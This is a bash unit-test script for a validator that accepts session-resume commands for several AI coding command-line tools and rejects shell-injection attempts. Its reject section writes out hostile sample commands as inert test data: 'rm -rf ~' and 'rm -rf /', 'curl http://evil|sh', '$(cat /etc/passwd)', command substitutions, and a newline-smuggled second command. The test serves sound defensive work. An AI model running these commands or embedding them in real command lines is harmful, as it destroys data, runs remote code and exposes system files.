#!/usr/bin/env bash
# validate_test.sh — unit tests for scripts/validate.sh.
#
# Pure string tests: the validator only runs `[[ =~ ]]`, it NEVER executes the
# sample commands, so the malicious payloads below are inert data. No tmux, no
# socket, no side effects — safe to run anywhere (including Linux CI).

set -u
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=/dev/null
. "$ROOT/scripts/validate.sh"

U='12345678-1234-1234-1234-123456789abc'
NL='
'
pass=0
fail=0

expect_allow() { # <tool> <cmd>
    if ar_validate "$1" "$2"; then pass=$((pass + 1)); printf 'PASS allow  %-8s %s\n' "$1" "$2"
    else fail=$((fail + 1)); printf 'FAIL allow  %-8s %s\n' "$1" "$2"; fi
}
expect_reject() { # <tool> <cmd>
    if ar_validate "$1" "$2"; then fail=$((fail + 1)); printf 'FAIL reject %-8s %s\n' "$1" "$(printf '%s' "$2" | tr "$NL" '~')"
    else pass=$((pass + 1)); printf 'PASS reject %-8s %s\n' "$1" "$(printf '%s' "$2" | tr "$NL" '~')"; fi
}

echo '--- legitimate resume commands must be ALLOWED ---'
expect_allow claude   "cd /Users/foo/proj && claude --resume $U"
expect_allow claude   "claude"
expect_allow claude   "cd /tmp && claude --model sonnet --resume $U"
expect_allow qwen     "qwen --resume $U"
expect_allow qwen     "cd /work/repo && qwen --resume $U"
expect_allow kimi     "kimi -r session_$U"
expect_allow kimi     "kimi"
expect_allow codex    "codex resume $U"
expect_allow codex    "cd /srv/app && codex resume $U"
expect_allow copilot  "cd /tmp && copilot --resume=$U"
expect_allow opencode "opencode -s ses_abc123XYZ"
expect_allow hermes   "hermes --resume 20260711_120000_abcdef"
expect_allow agy      "cd /a/b && agy --conversation $U"

echo '--- injection samples must be REJECTED (>= 6) ---'
expect_reject claude   "cd /tmp && claude --resume dead; rm -rf ~"
expect_reject claude   'claude $(whoami)'
expect_reject claude   'claude `id`'
expect_reject claude   "claude && curl http://evil|sh"
expect_reject codex    'codex resume $(cat /etc/passwd)'
expect_reject claude   "cd /tmp; rm -rf / && claude"
expect_reject qwen     "qwen --resume x${NL}rm -rf ~"
expect_reject claude   "claude | tee /etc/passwd"
expect_reject bogus    "bogus --help"

printf -- '----\n%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ] && exit 0 || exit 1
